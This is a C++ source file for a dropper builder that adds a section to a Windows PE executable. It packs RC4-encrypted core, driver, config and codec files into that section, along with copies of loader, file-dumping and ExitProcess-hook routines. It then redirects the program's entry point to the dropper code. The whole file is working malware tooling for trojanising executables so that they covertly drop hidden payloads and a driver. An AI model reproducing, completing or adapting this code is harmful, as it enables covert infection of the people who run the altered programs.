#include <iostream>
#include <fstream>

#include "PEObject.h"
#include "DropperSection.h"
#include "XRefNames.h"
#include "rc4.h"

using namespace std;

extern char* _needed_strings[];
extern XREFNAMES data_imports[];

void rc4crypt(const unsigned char *key, size_t keylen,
			  unsigned char *data, size_t data_len);

DropperSection::DropperSection(PEObject& pe, string name, DWORD FileAlignment)
:  GenericSection(pe, name, FileAlignment), _manifestOffset(0)
{
	_files.core.buffer = NULL; _files.core.size = 0;
	_files.config.buffer = NULL; _files.config.size = 0;
	_files.codec.buffer = NULL; _files.codec.size = 0;
	_files.driver.buffer = NULL; _files.driver.size = 0;
	
	int i = 0;
	while (_needed_strings[i] != NULL) {
		_strings.push_back(std::string(_needed_strings[i]));
		i++;
	}
}

DropperSection::~DropperSection(void)
{
}

DWORD DropperSection::build( WINSTARTFUNC OriginalEntryPoint)
{
	DWORD dataBufferSize = 0;
	
	unsigned int buffer_size = 65535 // account for header and accessory data (strings, calls, etc)
		+ _files.codec.size
		+ _files.core.size
		+ _files.config.size
		+ _files.driver.size
		+ _manifest.size();
	
	_data = new char[alignTo(buffer_size, this->FileAlignment())];
	char * ptr = _data;
	
	DataSectionHeader* header = (DataSectionHeader*)ptr;
	ZeroMemory(header, sizeof(DataSectionHeader));
	ptr += sizeof(DataSectionHeader);
	
	// Generate ecryption key
	string rc4_key;
	generate_key(rc4_key, sizeof(header->rc4key));
	memcpy(header->rc4key, rc4_key.c_str(), sizeof(header->rc4key));
	
	cout << "Key       : " << rc4_key << endl;
	cout << "Key length: " << dec << sizeof(header->rc4key) << endl;	
	
	// Original EP
	header->pfn_OriginalEntryPoint = OriginalEntryPoint;
	
	// ExitProcess index
	header->exitProcessIndex = _exitProcessIndex;
	header->exitIndex = _exitIndex;
		
	// Strings offsets
	header->stringsOffsets.offset = ptr - _data;
	DWORD * strOffset = (DWORD *) ptr;
	ptr += _strings.size() * sizeof(DWORD);
	
	// Strings
	header->strings.offset = ptr - _data;
	
	for ( std::list<std::string>::iterator iter = _strings.begin();
		iter != _strings.end(); 
		iter++ )
	{
		// store offset of string
		(*strOffset) = ptr - (header->strings.offset + _data); strOffset++;
		
		// store string data
		(void) memcpy( ptr, (*iter).c_str(), (*iter).size() + 1);
		
		ptr += (*iter).size() + 1;
	}
	header->strings.size = ptr - (_data + header->strings.offset);
	
	// Calls
	header->dlls.offset = ptr - _data;
	DWORD totalCalls = 0;
	for ( int i = 0; data_imports[i].dll; i++ )
	{
		// account for nCalls field
		char* ptrToNCalls = ptr;
		ptr += sizeof(DWORD);
		
		// dll name
		(void) memcpy( ptr, data_imports[i].dll, strlen(data_imports[i].dll) + 1 );
		ptr += (UINT)strlen(data_imports[i].dll) + 1;
		
		// copy call names
		DWORD nCalls = 0;
		for ( int iD = 0; data_imports[i].calls[iD] != NULL; iD++ )
		{
			(void) memcpy( ptr, data_imports[i].calls[iD], strlen(data_imports[i].calls[iD]) + 1);
			ptr += (UINT)strlen(data_imports[i].calls[iD]) + 1;
			nCalls++;
		}
		
		// fill nCalls field
		memcpy(ptrToNCalls, &nCalls, sizeof(nCalls));
		totalCalls += nCalls;
	}
	header->dlls.size = ptr - (_data + header->dlls.offset);
	
	// reserve space for Dll calls addresses
	header->callAddresses.offset = ptr - _data;
	header->callAddresses.size = totalCalls * sizeof(DWORD);
	ptr += header->callAddresses.size;
	
	// add core file
	if (_files.core.buffer != NULL && _files.core.size > 0) {
		header->files.names.core.offset = ptr - _data;
		header->files.names.core.size = _files.core.name.size() + 1;
		
		memcpy(ptr, _files.core.name.c_str(), header->files.names.core.size);
		ptr += header->files.names.core.size;
		
		header->files.core.offset = ptr - _data;
		header->files.core.size = _files.core.size;
		
		// crypt and write file
		rc4crypt((unsigned char*)header->rc4key, RC4KEYLEN, (unsigned char*)_files.core.buffer, _files.core.size);
		memcpy(ptr, _files.core.buffer, _files.core.size);
		
		ptr += _files.core.size;
	}
	
	// add driver file
	if (_files.driver.buffer != NULL && _files.driver.size > 0) {
		header->files.names.driver.offset = ptr - _data;
		header->files.names.driver.size = _files.driver.name.size() + 1;

		memcpy(ptr, _files.driver.name.c_str(), header->files.names.driver.size);
		ptr += header->files.names.driver.size;

		header->files.driver.offset = ptr - _data;
		header->files.driver.size = _files.driver.size;

		rc4crypt((unsigned char*)header->rc4key, RC4KEYLEN, (unsigned char*)_files.driver.buffer, _files.driver.size);
		memcpy(ptr, _files.driver.buffer, _files.driver.size);

		ptr += _files.driver.size;
	}
	
	// add config file
	if (_files.config.buffer != NULL && _files.config.size > 0) {
		header->files.names.config.offset = ptr - _data;
		header->files.names.config.size = _files.config.name.size() + 1;
		
		memcpy(ptr, _files.config.name.c_str(), header->files.names.config.size);
		ptr += header->files.names.config.size;
		
		header->files.config.offset = ptr - _data;
		header->files.config.size = _files.config.size;
		
		rc4crypt((unsigned char*)header->rc4key, RC4KEYLEN, (unsigned char*)_files.config.buffer, _files.config.size);
		memcpy(ptr, _files.config.buffer, _files.config.size);
		
		ptr += _files.config.size;
	}
	
	// add codec file
	if (_files.codec.buffer != NULL && _files.codec.size > 0) {
		header->files.names.codec.offset = ptr - _data;
		header->files.names.codec.size = _files.codec.name.size() + 1;
		
		memcpy(ptr, _files.codec.name.c_str(), header->files.names.codec.size);
		ptr += header->files.names.codec.size;
		
		header->files.codec.offset = ptr - _data;
		header->files.codec.size = _files.codec.size;
		
		rc4crypt((unsigned char*)header->rc4key, RC4KEYLEN, (unsigned char*)_files.codec.buffer, _files.codec.size);
		memcpy(ptr, _files.codec.buffer, _files.codec.size);
		
		ptr += _files.codec.size;
	}
	
	// original OEP code
	memcpy(ptr, _originalOEPCode, _originalOEPCodeSize);
	header->originalOEPCode.offset = ptr - _data;
	header->originalOEPCode.size = _originalOEPCodeSize;
	ptr += _originalOEPCodeSize;
	
	// Total data section size
	dataBufferSize = ptr - _data;
	
	memcpy(ptr, &dataBufferSize, sizeof(dataBufferSize));
	ptr += sizeof(dataBufferSize);
	
	// END marker
	memcpy(ptr, "<E>\0", 4);
	ptr += 4;
	
	DWORD newEP = ptr - _data;
	
	// Dropper code
	DWORD newEPSize = (DWORD)NewEntryPoint_End - (DWORD)NewEntryPoint; 
	memcpy(ptr, (PBYTE) NewEntryPoint, newEPSize);
	ptr += newEPSize;
	
	cout << "NewEntryPoint is " << newEPSize << " bytes long, offset " << newEP << endl;
	
	// CoreThreadProc code
	DWORD threadProcSize = (DWORD)CoreThreadProc_End - (DWORD)CoreThreadProc;
	memcpy(ptr, (PBYTE) CoreThreadProc, threadProcSize);
	header->functions.coreThread.offset = ptr - _data;
	header->functions.coreThread.size = threadProcSize;
	ptr += threadProcSize;
	
	cout << "CoreThreadProc is " << threadProcSize << " bytes long, offset " << header->functions.coreThread.offset << endl;
	
	// DumpFile code
	DWORD dumpFileSize = (DWORD) DumpFile_End - (DWORD) DumpFile;
	memcpy(ptr, (PBYTE) DumpFile, dumpFileSize);
	header->functions.dumpFile.offset = ptr - _data;
	header->functions.dumpFile.size = dumpFileSize;
	ptr += dumpFileSize;
	
	cout << "DumpFile is " << dumpFileSize << " bytes long, offset " << header->functions.dumpFile.offset << endl;
	
	// ExitProcessHook data
	// DWORD offsetToExitProcessHookData = ptr - _data;
	// memcpy(ptr, &offsetToExitProcessHookData, sizeof(DWORD));
	*((DWORD*) ptr) = ptr - _data;
	ptr += sizeof(DWORD);
	
	// END marker
	memcpy(ptr, "<E>\0", 4);
	ptr += 4;
	
	// ExitProcessHook code
	DWORD exitProcessHookSize = (DWORD)ExitProcessHook_End - (DWORD)ExitProcessHook;
	
	memcpy(ptr, (PBYTE) ExitProcessHook, exitProcessHookSize);
	header->functions.exitProcessHook.offset = ptr - _data;
	header->functions.exitProcessHook.size = exitProcessHookSize;
	ptr += exitProcessHookSize;
	
	cout << "ExitProcessHook is " << exitProcessHookSize << " bytes long, offset " << (DWORD)header->functions.exitProcessHook.offset << endl;

	// ExitHook code
	DWORD exitHookSize = (DWORD)ExitHook_End - (DWORD)ExitHook;
	
	memcpy(ptr, (PBYTE) ExitHook, exitHookSize);
	header->functions.exitHook.offset = ptr - _data;
	header->functions.exitHook.size = exitHookSize;
	ptr += exitHookSize;
	
	cout << "ExitHook is " << exitHookSize << " bytes long, offset " << (DWORD)header->functions.exitHook.offset << endl;
	
	//
	// RC4
	//
	
	DWORD rc4Size = (DWORD) rc4_skip_End - (DWORD) rc4_skip;
	memcpy(ptr, rc4_skip, rc4Size);
	header->functions.rc4.offset = ptr - _data;
	header->functions.rc4.size = rc4Size;
	ptr += rc4Size;
	
	cout << "RC4 is " << rc4Size << " bytes long, offset " << (DWORD)header->functions.rc4.offset << endl;
	
	// compute total size
	size_t virtualSize = ptr - _data;
	_size = this->alignTo(virtualSize, this->FileAlignment());
	
	cout << "Total dropper size is " << _size << " bytes." << endl;
	
	// update section data
	SetSizeOfRawData(this->alignTo(_size, FileAlignment() ));
	SetVirtualSize(virtualSize);
	
	// return offset to new EP
	return newEP;
}

bool DropperSection::addCoreFile( std::string path, std::string name )
{
	cout << "Adding core file \"" << path << "\" as \"" << name << "\"." << endl;
	_files.core.name = name;
	return _readFile(path, _files.core);	
}

bool DropperSection::addDriverFile( std::string path, std::string name )
{
	cout << "Adding driver file \"" << path << "\" as \"" << name << "\"." << endl;
	_files.driver.name = name;
	return _readFile(path, _files.driver);
}

bool DropperSection::addConfigFile( std::string path, std::string name )
{
	cout << "Adding config file \"" << path << "\" as \"" << name << "\"." << endl;
	_files.config.name = name;
	return _readFile(path, _files.config);
}

bool DropperSection::addCodecFile( std::string path, std::string name )
{
	cout << "Adding codec file \"" << path << "\" as \"" << name << "\"." << endl;
	_files.codec.name = name;
	return _readFile(path, _files.codec);
}

bool DropperSection::_readFile( std::string path, NamedFileBuffer& buffer )
{
	std::ifstream file(path.c_str(), ios::binary);
	
	if (!file.is_open())
		return false;
	
	// get length of file
	
	file.seekg(0, ios::end);
	buffer.size = file.tellg();
	file.seekg(0, ios::beg);
	
	buffer.buffer = new char[buffer.size];
	
	file.read(buffer.buffer, buffer.size);
	file.close();
	
	return true;
}

void DropperSection::setOriginalOEPCode( unsigned char const * const code, size_t size )
{
	_originalOEPCode = new unsigned char[size];
	memcpy(_originalOEPCode, code, size);
	_originalOEPCodeSize = size;
}

void rc4crypt(const unsigned char *key, size_t keylen,
			  unsigned char *data, size_t data_len)
{
	unsigned int i, j, k;
	unsigned char *pos;
	unsigned char S[256];
	size_t kpos;
	size_t skip = 0;

	/* Setup RC4 state */
	for (i = 0; i < 256; i++)
		S[i] = i;
	j = 0;
	kpos = 0;
	for (i = 0; i < 256; i++) {
		j = (j + S[i] + key[kpos]) & 0xff;
		kpos++;
		if (kpos >= keylen)
			kpos = 0;
		S_SWAP(i, j);
	}

	/* Skip the start of the stream */
	i = j = 0;
	for (k = 0; k < skip; k++) {
		i = (i + 1) & 0xff;
		j = (j + S[i]) & 0xff;
		S_SWAP(i, j);
	}

	/* Apply RC4 to data */
	pos = data;
	for (k = 0; k < data_len; k++) {
		i = (i + 1) & 0xff;
		j = (j + S[i]) & 0xff;
		S_SWAP(i, j);
		*pos++ ^= S[(S[i] + S[j]) & 0xff];
	}
}